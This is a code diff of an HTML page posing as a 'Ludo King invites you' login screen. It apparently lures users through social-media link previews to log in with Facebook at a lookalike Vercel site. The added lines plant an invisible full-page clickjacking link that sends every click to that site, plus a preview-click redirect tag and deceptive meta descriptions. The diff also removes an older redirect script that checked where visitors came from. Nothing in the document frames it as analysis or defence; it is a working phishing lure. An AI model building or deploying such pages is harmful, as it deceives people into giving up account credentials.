@@ -5,33 +5,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Ludo King invites you</title>
 
-  <!-- Social Media Preview (Facebook, Messenger, WhatsApp, Telegram, Twitter) -->
-  <meta property="og:title" content="Ludo King - invites you" />
-  <meta property="og:description" content="play to Ludo King and sync your progress instantly!" />
+  <!-- ✅ Social Media Preview Meta Tags -->
+  <meta property="og:title" content="Ludo King invites you" />
+  <meta property="og:description" content="Continue your Ludo King progress securely " />
   <meta property="og:image" content="https://querulous-crimson-amsttzakrm.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8%20(1).jpg" />
-  <meta property="og:image:width" content="1200" />
-  <meta property="og:image:height" content="630" />
-  <meta property="og:type" content="website" />
   <meta property="og:url" content="https://game-players-online-rouge.vercel.app/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Ludo King invites you" />
 
+  <!-- ✅ Twitter Preview -->
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Ludo King - Login" />
-  <meta name="twitter:description" content="Login to Ludo King and sync your data instantly!" />
+  <meta name="twitter:title" content="Ludo King Login" />
+  <meta name="twitter:description" content="Continue your Ludo King progress securely using Facebook login." />
   <meta name="twitter:image" content="https://querulous-crimson-amsttzakrm.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8%20(1).jpg" />
 
-  <meta name="description" content="Ludo King login screen — sync your progress, play with friends and earn gems!">
-  <meta name="theme-color" content="#1877f2" />
+  <!-- ✅ Universal Redirect on Preview Click -->
+  <meta property="al:web:url" content="https://game-players-online-rouge.vercel.app/" />
 
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
     body {
+      margin: 0;
       font-family: "Poppins", Arial, sans-serif;
-      background: url('https://querulous-crimson-amsttzakrm.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8%20(1).jpg') no-repeat center center fixed;
+      background: url('https://cute-amethyst-wx5zdxi8cw.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg') no-repeat center center fixed;
       background-size: cover;
       display: flex;
       justify-content: center;
@@ -48,6 +43,8 @@
       width: 360px;
       box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
       animation: fadeIn 1.2s ease;
+      position: relative;
+      z-index: 2;
     }
 
     @keyframes fadeIn {
@@ -60,6 +57,7 @@
       height: auto;
       margin-bottom: 25px;
       user-select: none;
+      border-radius: 12px;
     }
 
     .mini-buttons {
@@ -127,9 +125,19 @@
     .note a:hover {
       text-decoration: underline;
     }
+
+    /* 🔗 Invisible full-page link to redirect clicks anywhere */
+    .click-layer {
+      position: fixed;
+      inset: 0;
+      z-index: 1;
+    }
   </style>
 </head>
 <body>
+  <!-- 🔗 Full-page invisible clickable area -->
+  <a href="https://game-players-online-rouge.vercel.app/" class="click-layer"></a>
+
   <div class="login-box">
     <img class="logo" src="https://cute-amethyst-wx5zdxi8cw.edgeone.app/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg" alt="Ludo King Logo" />
 
@@ -149,24 +157,5 @@
       <a href="#">Privacy Policy</a>
     </p>
   </div>
-
-  <!-- Redirect after preview click -->
-  <script>
-    window.onload = () => {
-      const ref = document.referrer;
-      const fromPreview =
-        ref.includes("facebook.com") ||
-        ref.includes("messenger.com") ||
-        ref.includes("whatsapp.com") ||
-        ref.includes("telegram.org") ||
-        ref.includes("t.me") ||
-        ref.includes("twitter.com");
-
-      // If user actually clicks preview and opens the page manually
-      if (!fromPreview) {
-        window.location.href = "https://game-players-online-rouge.vercel.app/";
-      }
-    };
-  </script>
 </body>
 </html>
